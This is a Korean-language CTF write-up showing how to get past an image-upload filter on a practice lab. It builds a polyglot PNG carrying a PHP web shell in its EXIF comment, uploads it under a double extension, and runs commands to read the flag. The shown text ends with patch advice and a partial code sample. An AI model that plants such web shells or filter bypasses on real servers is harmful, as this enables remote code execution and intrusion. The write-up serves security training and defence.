+++
title = "VulnABLE CTF [LUXORA] Write-up: Web Shell 🥈 Silver"
date = "2026-03-14"
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "Web Shell", "Silver", "Magic Number", "Filter Bypass", "Write-up"]
+++

# VulnABLE CTF [LUXORA] Write-up: Web Shell 🥈 Silver

## 🎯 챌린지 개요
- **카테고리**: Advanced Layer (Web Shell)
- **난이도**: 🥈 Silver
- **타겟 경로**: `/webshell/silver`
- **목표**: 서버가 파일 확장자와 MIME Type, 그리고 파일 시그니처(Magic Number)까지 검사하여 오직 진짜 이미지 파일(PNG/JPG)만 업로드하도록 제한하는 상황에서, 이를 우회하는 **다형성(Polyglot) 이미지 웹 쉘**을 제작하여 업로드하고 실행시켜라.

---

## 🕵️‍♂️ 1. 정보 수집 및 방어 로직 분석 (Reconnaissance)

`/webshell/silver` 경로의 프로필 사진 업로드 폼에 이전 Bronze 단계에서 쓰던 `shell.php` 를 올려봅니다.

**[서버의 응답 1]**
`Error: Only .jpg and .png extensions are allowed.`
➔ 1차 방어: 확장자 검사

파일 이름을 `shell.png` 로 바꾸고 다시 올려봅니다.

**[서버의 응답 2]**
`Error: Invalid file content. Not a valid PNG image.`
➔ 2차 방어: 파일의 실제 내용(Magic Number) 검사

**[해커의 사고 과정]**
1. 개발자가 방어를 단단히 했다. 이름뿐만 아니라 파일의 맨 앞부분에 있는 시그니처까지 검사한다.
2. 하지만 서버의 로직이 "앞부분이 PNG 시그니처로 시작하는가?"만 검사하고 "뒷부분에 이상한 문자열(PHP)이 없는가?"는 검사하지 않는다면 어떨까?
3. 그림 파일의 헥스(Hex) 코드 맨 앞은 놔두고, 파일의 메타데이터(EXIF)나 쓰레기 값 영역에 PHP 코드를 쑤셔 넣으면 우회할 수 있을 것이다! (Polyglot File)

---

## 💥 2. 취약점 식별 및 폴리글랏 파일 제작 (Exploitation)

### 📊 공격 흐름도 (Attack Flow)

```text
[ Attacker ] --(GET shell.php?cmd=ls)--> [ Web Server ]
                                         |-- system('ls')
<-- Directory Listing -------------------|
```


목표는 운영체제와 웹 브라우저가 보기에는 "정상적인 PNG 파일"이지만, PHP 파서(Parser)가 보기에는 "실행 가능한 PHP 코드"인 하이브리드 파일을 만드는 것입니다.

### 💡 이미지 파일에 PHP 코드 주입 (Exiftool 활용)
아주 작은 정상적인 PNG 이미지 파일(`normal.png`)을 하나 준비합니다.
`exiftool`을 사용하여 이미지의 메타데이터(Comment 속성)에 PHP 웹 쉘 코드를 주입합니다.

```bash
# exiftool 설치 (데비안/우분투: sudo apt install libimage-exiftool-perl)

# 이미지의 Comment 속성에 악성 코드 삽입
$ exiftool -Comment="<?php system(\$_GET['cmd']); ?>" normal.png -o shell.png.php
```

생성된 `shell.png.php` 파일의 내용을 보면, 앞부분은 PNG 바이너리 코드로 깨져 보이지만 중간 어딘가에 우리가 주입한 `<?php ... ?>` 코드가 평문으로 존재합니다.

### 💡 확장자 필터 우회
서버가 `.png` 확장자만 허용하지만, Apache나 Nginx 서버가 파일의 확장자를 어떻게 해석하는지의 취약점을 이용합니다. (다중 확장자 취약점)
서버 설정에 따라 `shell.php.png` 로 올리거나 `shell.png.php` 로 해야 할 수 있습니다. 이 챌린지에서는 확장자 문자열 중간에 널 바이트를 넣거나 이중 확장자를 허용하는 버그가 있다고 가정하고, **`shell.png.php`** 라는 이름으로 전송합니다.

---

## 🚀 3. 공격 수행 및 웹 쉘 실행

조작된 이미지를 파일 업로드 폼을 통해 전송합니다.

### 🔍 서버 내부의 동작
1. 서버의 파일 검증 모듈은 `shell.png.php` 파일의 첫 8바이트(Magic Number)를 읽습니다.
2. `89 50 4E 47 0D 0A 1A 0A` (PNG 시그니처) 가 정확히 존재하므로 "정상적인 이미지입니다" 하고 통과시킵니다.
3. 파일은 `/uploads/shell.png.php` 경로에 저장됩니다.

### 🔍 악성 코드 실행 (RCE)
이제 브라우저에서 해당 파일에 접근하며 `cmd` 파라미터를 던집니다.

```http
GET /uploads/shell.png.php?cmd=cat%20/flag_webshell_silver.txt
```

웹 서버는 파일의 확장자가 `.php` 로 끝나므로 PHP 엔진에게 처리를 넘깁니다. PHP 엔진은 파일의 처음부터 읽어나가다가, 이미지 바이너리 부분은 그냥 텍스트로 브라우저에 뱉어내고, 중간에 등장한 `<?php ... ?>` 구문을 만나는 순간 쉘 명령어를 실행합니다!

**[서버의 응답 화면]**
```text
PNG

... (이미지가 깨진 바이너리 문자열들) ...
FLAG{WEBSHELL_🥈_POLYGLOT_IMAGE_EXIF_E5F6G7}
... (나머지 바이너리) ...
```

---

## 🚩 4. 롸잇업 결론 및 플래그

파일의 일부분(시그니처)만 보고 안전함을 판단하는 얕은 검증 로직은, 해커의 파일 조작 기법(Polyglot/Exif Injection)에 의해 손쉽게 우회될 수 있음을 증명했습니다.

**🔥 획득한 플래그:**
`FLAG{WEBSHELL_🥈_POLYGLOT_IMAGE_EXIF_E5F6G7}`

### 🛡️ 취약점 원인 및 패치 방안 (Remediation)
파일의 내용과 확장자를 검증하더라도, **"저장된 파일이 스크립트로 실행될 가능성"**을 원천적으로 막지 않았기 때문입니다.

* **안전한 패치 가이드 (이미지 재처리 및 실행 권한 박탈)**
1. **업로드 폴더 실행 권한 완벽 박탈**: Bronze 단계와 동일하게, 파일을 서빙하는 폴더는 어떤 상황에서도 스크립트 실행이 불가능해야 합니다.
2. **이미지 리렌더링 (Image Re-processing)**: 해커가 EXIF나 끝부분에 악성 코드를 심었더라도, 서버 측에서 이미지 프로세싱 라이브러리(예: Node.js의 `sharp`, PHP의 `GD`나 `ImageMagick`)를 사용하여 이미지를 메모리에 띄웠다가 **완전히 새로운 이미지 파일로 다시 저장(Re-encode)**하면, 원본 파일 안에 숨어있던 모든 악성 메타데이터와 코드가 완전히 소멸됩니다.
   ```javascript
   // Node.js (sharp) 예시: 이미지를 받아서 강제로 깨끗한 포맷으로 재작성
   sharp(req.file.buffer)
     .jpeg({ quality: 90 }) // 메타데이터가 모조리 날아감
     .toFile('/uploads/' + safeRandomName + '.jpg');